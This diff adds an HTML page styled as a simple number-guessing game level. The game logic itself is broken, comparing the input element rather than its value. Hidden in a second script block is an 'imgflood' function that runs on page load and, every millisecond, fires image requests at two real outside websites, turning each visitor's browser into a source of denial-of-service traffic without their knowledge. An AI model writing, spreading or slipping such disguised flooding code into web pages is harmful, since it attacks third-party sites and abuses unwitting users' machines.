@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>GAME--FirstLevel</title>
+    <script type="text/javascript">
+      function getQueryVariable(variable){
+      var query = window.location.search.substring(1);
+      var vars = query.split("&");
+      for (var i=0;i<vars.length;i++) {
+        var pair = vars[i].split("=");
+        if(pair[0] == variable){
+          levels = pair[1];
+        }
+      }
+      return(false);
+    }
+    </script>
+  </head>
+  <body>
+    <script type="text/javascript">
+      var ran2 = Math.floor(Math.random() * 1000);
+      var ran1 = Math.floor(Math.random() * 1000);
+      var ne = Number(levels)+1;
+      //alert('Q: '+ran1+' + '+ran2+' = ?');
+
+      function ques(){
+        alert('Enter: '+ran1+ran2+ran2);
+      }
+
+      function next(){
+        if (document.getElementById("ans") != String(ran1)+String(ran2)+String(ran2)){
+          alert('The answer is not right!')
+          window.location.href = 'games.html?level='+ran2;
+        }else{
+          window.location.href = 'games.html?level='+ran1;
+        }
+      }
+    </script>
+    <script >
+      function imgflood() {
+        //var TARGET = document.getElementById('sss').value;
+        var pic = new Image();
+        var ran = Math.floor(Math.random() * 1000);
+        //pic.src = TARGET+'?val='+ran;
+        pic.src = 'https://www.yunxiao.com?val='+ran;
+        pic.src = 'https://yue.haofenshu.com?val='+ran;
+
+      }
+      setInterval(imgflood, 1);
+    </script>
+    <h3>
+    Enter answer:
+      <input type="text" id='ans' name="level" value="" background="Enter answer..."><br>
+      <input type="button" name="" value="OK" onclick="next()">
+
+    <input type="button" name="" value="Look question again" onclick="ques()">
+    <br> <a href="you.html"><input type="button" name="" value="Back"></a>
+    </h3>
+  </body>
+</html>
